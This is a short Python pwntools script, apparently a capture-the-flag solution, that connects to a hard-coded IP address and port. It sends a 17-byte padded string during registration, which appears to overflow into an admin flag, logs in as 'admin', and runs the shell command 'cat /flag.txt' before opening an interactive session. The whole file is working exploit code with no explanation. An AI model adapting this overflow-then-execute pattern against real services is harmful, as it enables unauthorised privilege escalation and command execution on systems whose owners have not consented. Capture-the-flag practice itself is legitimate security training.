#!/usr/bin/env python3
from pwn import *

target_ip = '140.113.207.245'
port = 30172

r = remote(target_ip, port)
print(r.recvline())
r.sendline(b'2')
print(r.recvline())
# into register
r.sendline(b'AAAABBBBCCCCDDDD1') # 17 bytes
r.sendline(b'1')

r.sendline(b'1')
# into login
r.sendline(b'admin')
r.sendline(b'1')

r.sendline(b'3')
# execute
r.sendline(b'cat /flag.txt')
print(r.recvline())

r.interactive()
